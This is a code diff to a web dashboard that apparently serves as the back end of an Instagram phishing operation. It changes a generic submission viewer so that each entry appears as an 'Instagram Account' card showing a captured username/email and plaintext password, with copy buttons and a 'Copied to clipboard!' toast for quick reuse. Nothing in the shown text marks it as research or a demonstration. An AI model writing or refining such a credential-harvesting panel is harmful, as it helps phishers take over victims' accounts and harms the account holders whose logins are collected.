@@ -113,7 +113,7 @@
     /* Responsive Grid */
     .grid {
       display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+      grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
       gap: 24px;
       margin-top: 16px;
     }
@@ -141,8 +141,8 @@
     .card-header {
       display: flex;
       justify-content: space-between;
-      align-items: flex-start;
-      margin-bottom: 16px;
+      align-items: center;
+      margin-bottom: 20px;
     }
 
     .user-badge {
@@ -153,17 +153,66 @@
       border: 1px solid rgba(24, 119, 242, 0.2);
       padding: 4px 12px;
       border-radius: 20px;
-      font-size: 13px;
+      font-size: 12px;
       font-weight: 600;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
     }
 
+    /* Structured Credential Layout */
     .card-body {
-      color: var(--text-primary);
-      font-size: 15px;
-      line-height: 1.6;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
       margin-bottom: 24px;
-      white-space: pre-wrap;
-      word-break: break-word;
+    }
+
+    .credential-field {
+      background: rgba(0, 0, 0, 0.25);
+      border-radius: 10px;
+      padding: 10px 14px;
+      border: 1px solid rgba(255, 255, 255, 0.03);
+    }
+    
+    .field-label {
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      color: var(--text-disabled);
+      margin-bottom: 4px;
+    }
+    
+    .field-value-wrapper {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 12px;
+    }
+    
+    .field-value {
+      font-size: 14px;
+      color: var(--text-primary);
+      font-family: 'Consolas', 'Courier New', monospace;
+      word-break: break-all;
+    }
+    
+    .copy-btn {
+      background: transparent;
+      border: none;
+      color: var(--cta-color);
+      font-size: 11px;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      cursor: pointer;
+      padding: 4px 8px;
+      border-radius: 6px;
+      transition: all 0.2s ease;
+    }
+    
+    .copy-btn:hover {
+      background: rgba(24, 119, 242, 0.15);
+      color: #FFFFFF;
     }
 
     .card-footer {
@@ -198,7 +247,7 @@
       border: 1px solid var(--card-border);
       border-radius: 20px;
       padding: 24px;
-      height: 180px;
+      height: 220px;
       display: flex;
       flex-direction: column;
       gap: 16px;
@@ -213,8 +262,7 @@
     }
 
     .skeleton-badge { width: 40%; height: 24px; }
-    .skeleton-text-1 { width: 90%; height: 16px; }
-    .skeleton-text-2 { width: 75%; height: 16px; }
+    .skeleton-field { width: 100%; height: 48px; border-radius: 10px; }
 
     @keyframes loading {
       0% { background-position: 200% 0; }
@@ -246,6 +294,28 @@
       font-size: 14px;
       margin-bottom: 24px;
       display: none;
+    }
+
+    /* Modern Copy Toast Alert */
+    .toast {
+      position: fixed;
+      bottom: 24px;
+      left: 50%;
+      transform: translateX(-50%) translateY(100px);
+      background: #1877F2;
+      color: white;
+      padding: 12px 24px;
+      border-radius: 50px;
+      font-size: 14px;
+      font-weight: 500;
+      box-shadow: 0 8px 24px rgba(24, 119, 242, 0.3);
+      transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      z-index: 1000;
+      pointer-events: none;
+    }
+    
+    .toast.show {
+      transform: translateX(-50%) translateY(0);
     }
 
     /* Mobile Responsive adjustments */
@@ -288,32 +358,36 @@
       <!-- Loading skeletons initially -->
       <div class="skeleton-card">
         <div class="skeleton-line skeleton-badge"></div>
-        <div class="skeleton-line skeleton-text-1"></div>
-        <div class="skeleton-line skeleton-text-2"></div>
+        <div class="skeleton-line skeleton-field"></div>
+        <div class="skeleton-line skeleton-field"></div>
       </div>
       <div class="skeleton-card">
         <div class="skeleton-line skeleton-badge"></div>
-        <div class="skeleton-line skeleton-text-1"></div>
-        <div class="skeleton-line skeleton-text-2"></div>
+        <div class="skeleton-line skeleton-field"></div>
+        <div class="skeleton-line skeleton-field"></div>
       </div>
       <div class="skeleton-card">
         <div class="skeleton-line skeleton-badge"></div>
-        <div class="skeleton-line skeleton-text-1"></div>
-        <div class="skeleton-line skeleton-text-2"></div>
+        <div class="skeleton-line skeleton-field"></div>
+        <div class="skeleton-line skeleton-field"></div>
       </div>
     </div>
   </div>
+
+  <!-- Sleek Toast Notification -->
+  <div id="copyToast" class="toast">Copied to clipboard!</div>
 
   <script>
     const grid = document.getElementById('submissionsGrid');
     const refreshBtn = document.getElementById('refreshBtn');
     const errorAlert = document.getElementById('errorAlert');
+    const copyToast = document.getElementById('copyToast');
 
     const skeletonHTML = `
       <div class="skeleton-card">
         <div class="skeleton-line skeleton-badge"></div>
-        <div class="skeleton-line skeleton-text-1"></div>
-        <div class="skeleton-line skeleton-text-2"></div>
+        <div class="skeleton-line skeleton-field"></div>
+        <div class="skeleton-line skeleton-field"></div>
       </div>
     `;
 
@@ -330,6 +404,19 @@
         });
       } catch (e) {
         return isoString;
+      }
+    }
+
+    // Modern Copy helper function
+    async function copyToClipboard(text) {
+      try {
+        await navigator.clipboard.writeText(text);
+        copyToast.classList.add('show');
+        setTimeout(() => {
+          copyToast.classList.remove('show');
+        }, 2000);
+      } catch (err) {
+        console.error('Failed to copy text:', err);
       }
     }
 
@@ -360,19 +447,39 @@
         }
 
         data.forEach(entry => {
-          const user = entry.data?.demoUser || 'Anonymous';
-          const text = entry.data?.demoText || '(No Content)';
+          const username = entry.data?.username || 'Anonymous';
+          const password = entry.data?.password || '';
           const rawTimestamp = entry.data?.timestamp || entry.uploadedAt;
           const displayTime = formatDate(rawTimestamp);
 
           const card = document.createElement('div');
           card.className = 'card';
+          
+          // Escape values for rendering, but preserve raw values for copying
+          const escUsername = escapeHTML(username);
+          const escPassword = escapeHTML(password);
+
           card.innerHTML = `
             <div>
               <div class="card-header">
-                <span class="user-badge">${escapeHTML(user)}</span>
+                <span class="user-badge">Instagram Account</span>
               </div>
-              <div class="card-body">${escapeHTML(text)}</div>
+              <div class="card-body">
+                <div class="credential-field">
+                  <div class="field-label">Username / Email</div>
+                  <div class="field-value-wrapper">
+                    <span class="field-value">${escUsername}</span>
+                    <button class="copy-btn" data-copy="${escapeAttribute(username)}">Copy</button>
+                  </div>
+                </div>
+                <div class="credential-field">
+                  <div class="field-label">Password</div>
+                  <div class="field-value-wrapper">
+                    <span class="field-value">${escPassword}</span>
+                    <button class="copy-btn" data-copy="${escapeAttribute(password)}">Copy</button>
+                  </div>
+                </div>
+              </div>
             </div>
             <div class="card-footer">
               <div class="timestamp">
@@ -386,6 +493,14 @@
             </div>
           `;
           grid.appendChild(card);
+        });
+
+        // Add event listeners dynamically to copy buttons
+        document.querySelectorAll('.copy-btn').forEach(btn => {
+          btn.addEventListener('click', (e) => {
+            const textToCopy = e.target.getAttribute('data-copy');
+            copyToClipboard(textToCopy);
+          });
         });
 
       } catch (err) {
@@ -408,6 +523,10 @@
           '"': '&quot;'
         }[tag] || tag)
       );
+    }
+
+    function escapeAttribute(str) {
+      return str.replace(/"/g, '&quot;');
     }
 
     refreshBtn.addEventListener('click', loadData);
